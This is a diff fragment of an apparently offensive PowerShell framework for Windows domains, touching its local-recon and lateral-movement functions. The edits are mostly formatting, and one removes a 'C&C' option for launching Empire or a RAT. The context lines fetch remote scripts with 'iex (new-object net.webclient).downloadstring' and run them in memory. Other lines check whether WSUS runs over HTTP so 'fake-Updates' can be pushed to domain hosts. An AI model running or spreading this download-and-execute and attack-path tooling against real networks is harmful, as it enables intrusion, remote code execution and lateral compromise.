@@ -289,14 +289,14 @@ function localreconmodules
             Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
 
             #Check for WSUS Updates over HTTP
-	        $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
+	    $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
             $WUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name WUServer -ErrorAction SilentlyContinue).WUServer
 
             if($UseWUServer -eq 1 -and $WUServer.ToLower().StartsWith("http://")) 
 	        {
         	    Write-Host -ForegroundColor Yellow "WSUS Server over HTTP detected, most likely all hosts in this domain can get fake-Updates!"
-		        echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> "$currentPath\LocalRecon\WsusoverHTTP.txt"
-            }
+		    echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> "$currentPath\LocalRecon\WsusoverHTTP.txt"
+                }
 
             #Check for SMB Signing
             iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/leechristensen/Random/master/PowerShellScripts/Invoke-SMBNegotiate.ps1')
@@ -382,7 +382,7 @@ function localreconmodules
             {
                 Write-Host -ForegroundColor Yellow 'Searching for Files - Output is saved to the localrecon folder:'
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/leechristensen/Random/master/PowerShellScripts/Get-DotNetServices.ps1')
-                Get-DotNetServices  >> $currentPath\LocalRecon\DotNetBinaries.txt
+                Get-DotNetServices  >> "$currentPath\LocalRecon\DotNetBinaries.txt"
             }
 
             if (isadmin)
@@ -658,7 +658,7 @@ function latmov
            else { Write-Host -ForegroundColor Red 'No Systems with admin-Privileges found in this domain' }
         }
     }
-    elseif ($exploitdecision -eq "empire" -or $exploitdecision -eq "RAT" -or $exploitdecision -eq "C&C")
+    elseif ($exploitdecision -eq "empire" -or $exploitdecision -eq "RAT")
     {
         empirelauncher
     }
